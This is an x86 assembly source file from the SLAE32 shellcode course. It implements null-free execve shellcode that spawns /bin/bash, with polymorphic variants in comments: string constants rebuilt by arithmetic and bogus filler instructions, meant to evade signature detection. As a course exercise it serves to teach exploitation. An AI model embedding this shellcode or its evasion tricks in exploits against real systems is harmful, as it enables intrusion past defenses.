; execve-polymorphism.nasm
; SLAE32
; Polymorphism EXECVE using Stack method, no NULL
; 
; int execve(const char *pathname, char *const argv[], char *const envp[]);
;   - execve does NOT need a return if successful
; EAX = syscall
; EBX = /bin/bash, 0x0
; ECX = Address of /bin/bash,0x00000000
; EDX = 0x00000000
; ESI -> /bin/bash
;

global _start

section .text
_start: 

    xor eax, eax
    push eax            ; Push 0x00000000 (NULL DWORD)

    ; More obfuscation instead of the above 2 instructions
    ;
    ;   mov ebx, eax                ; Move EAX into EBX
    ;   xor eax, ebx                ; XOR EAX with EBX (which contains the same value) = 0
    ;   mov dword [esp-4], eax      ; == PUSH eax
    ;   sub esp, 4                  ; Fix stack pointer, before moving into next MOV (PUSH) setup for /bin/bash

    
    ; Build the stack using MOV instead of PUSH
    mov dword [esp-4], 0x68736162       ; == push 0x68736162     ; hsab          ////bin/bash - 12 chars, divisible by 4, and NULL terminated ^
    mov dword [esp-8], 0x2f6e6962       ; == push 0x2f6e6962     ; /nib
    mov dword [esp-12], 0x2f2f2f2f      ; == push 0x2f2f2f2f     ; ////

    ; cld       ; BOGUS 1: Able to toss in Bogus instructions like CLD since not using it

    ; To further obfuscate the above MOV's since they are still plaintext hex values
    ; This will increase the shellcode size...
    ; Use math to rebuild it as follows:
    ;
    ;   mov esi, 0x57625051     
    ;   add esi, 0x11111111         ; 0x57625051 + 0x11111111 == 0x68736162 ( hsab )
    ;   mov dword [esp-4], esi      ; Put the rebuilt value on the stack
    ;   mov esi, 0x1e5d5851
    ;   add esi, 0x11111111         ; 0x1e5d5851 + 0x11111111 == 0x2f6e6962 ( /nib )
    ;   mov dword [esp-8], esi      ; Put the rebuilt value on the stack
    ;   mov esi, 0x1e1e1e1e
    ;   add esi, 0x11111111         ; 0x1e1e1e1e + 0x11111111 == 0x2f2f2f2f ( //// )
    ;   mov dword [esp-12], esi     ; Put the rebuilt value on the stack


    ; std       ; BOGUS 2: Able to toss in Bogus instructions like STD since not using it

    sub esp, 12         ; Adjust the ESP pointer since just modified it above using MOV

    mov ebx, esp        ; MOV address of ////bin/bash string just PUSH'd into EBX

    push eax            ; Push 0x00000000 (NULL DWORD) for EDX prep
    mov edx, esp        ; MOV this null address location in EDX register

    push ebx            ; Save address of WHERE the ////bin/bash,0x0 string is onto stack
    mov ecx, esp        ; MOV address of string into ECX

    mov al, 11          ; 11 (0xB) is execve
    int 0x80